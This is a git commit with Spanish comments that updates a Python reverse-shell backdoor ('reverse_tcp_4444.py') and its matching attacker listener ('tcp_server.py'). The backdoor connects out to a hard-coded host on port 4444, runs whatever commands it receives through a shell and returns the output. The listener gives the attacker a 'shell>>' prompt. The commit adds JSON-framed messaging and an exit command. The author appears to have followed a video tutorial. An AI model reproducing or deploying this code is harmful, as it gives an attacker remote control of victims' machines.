a269e0eb14436a3cb8d29d39f42321af056ea650
Carlos Ayala <49286868+SrMai@users.noreply.github.com>
2021-12-30 17:59:46 -0600

    Ya no se pierden paquetes y se agregaron comandos
    Se añadio una función para poder añadir comandos al código, "salir".
    Ya no se pierden paquetes al enviar comandos.

--- reverse_tcp_4444.py
+++ reverse_tcp_4444.py
@@ -1,22 +1,36 @@
-#continuar luego
-#https://youtu.be/G0Bb0lvAspo?t=2231
 import socket
 import subprocess
+import json
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Define la variable connection
-        self.connection.connect((ip, port)) #Hace la conexión al servidor del atacante
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_recive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
     def ejecutar_comando(self, command): #Ejecuta el comando que envia el atacante
         return subprocess.check_output(command, shell=True) #Ejecuta el comando que envia el atacante
     
     def run(self):
         while True:
-            command=self.connection.recv(1024) #Obtiene el comando escrito por el atacante
+            command=self.reliable_recive() #Obtiene el comando escrito por el atacante
+            if command[0] == "salir":
+                self.connection.close()
+                exit()
             resultados_comando = self.ejecutar_comando(command) #Se guardan lso resultados obtenidos
-            self.connection.send(resultados_comando) #Envia lo obtenido en pantalla al ejecutar el comando del atacante
-        connection.close() #Se cierra la conexion
+            self.reliable_send(resultados_comando) #Envia lo obtenido en pantalla al ejecutar el comando del atacante
         
 puerta  = Backdoor("192.168.100.40", 4444) #Direccion ip del servidor a donde van los datos
 puerta.run()
--- tcp_server.py
+++ tcp_server.py
@@ -1,6 +1,5 @@
-#continuar luego
-#https://youtu.be/G0Bb0lvAspo?t=2231
 import socket
+import json
 
 class Listener:
     def __init__(self, ip , port):
@@ -16,13 +15,33 @@ class Listener:
 
         print("Tenemos una conexion de " + str(address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_recive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def ejecutar_remoto(self, command): #Ejecuta el comando que se envio en Run()
-        self.connection.send(command)
-        return self.connection.recv(1024) #Retorna lo recibido en el comando
+        self.reliable_send(command)
+        
+        if command[0] == "salir":
+            self.connection.close()
+            exit()
+            
+            
+        return self.reliable_recive() #Retorna lo recibido en el comando
         
     def run(self):
         while True:
             command = raw_input("shell>>")
+            command = command.split(" ")
             result = self.ejecutar_remoto(command)
             print(result)  #Muestra en pantalla el valor retornado
 
